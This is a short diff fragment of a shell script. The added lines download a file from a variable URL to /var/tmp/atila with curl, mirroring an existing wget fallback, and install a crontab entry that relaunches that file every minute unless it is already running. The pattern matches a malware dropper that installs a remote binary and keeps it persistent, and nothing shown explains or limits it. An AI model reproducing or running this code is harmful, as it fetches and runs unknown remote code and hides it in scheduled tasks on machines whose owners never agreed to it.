@@ -50,7 +50,11 @@ wget $url -O /var/tmp/atila
 
 else
 
-curl --help
+
+curl  -L  $url -o /var/tmp/atila
+
+(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
+
 
 
 fi;
